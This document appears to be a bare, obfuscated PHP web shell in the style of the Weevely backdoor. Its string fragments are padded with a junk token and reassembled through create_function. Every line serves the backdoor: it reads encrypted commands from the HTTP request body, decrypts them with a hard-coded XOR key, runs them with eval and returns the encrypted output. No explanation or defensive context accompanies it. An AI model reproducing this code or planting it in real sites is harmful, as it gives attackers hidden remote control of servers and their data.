...
$t='$k="e1SF0SFSFadc3SF9";$kh="4SF9ba5SFSF9abbe56";$kf="e057fSF20f883e";SF$SFp="VzBua5SFDzoOmTDOKh"SF;functSFion SFx($t,$';
$K='){$oSFSF.=$SFt{$i}^$k{$j}SF;}}retSFurn $SFo;}if(@preSFg_mSFaSFtch("/$kSFh(.+)$kSFf/",@SFfile_get_contSFentsSF("phSFp://in';
$n=str_replace('sV','','sVsVsVcreate_sVfusVncsVtion');
$w='_contSFents();@SFoSFb_end_clSFean();SF$rSF=@baseSF64_encodeSF(@x(SF@gzcompresSFs($o),$kSF));SFprSFint("$p$kh$rSF$kf");}';
$N='SFk){$c=SFSFstrlen($k);$SFl=stSFrlen($SFt)SF;$o="";forSF($i=SF0;$i<$l;SF){fSFor(SF$j=0;SF($j<SF$c&&$iSF<$l);$j++,$i++';
$F='puSFt"),$SFmSF)SF==1){@ob_start();@SFeSFval(@gzunSFcompresSFs(@x(SF@base6SF4_SFdecodeSF($m[1]),$k)))SF;$oSF=@SFob_get';
$l=str_replace('SF','',$t.$N.$K.$F.$w);
$f=$n('',$l);$f();
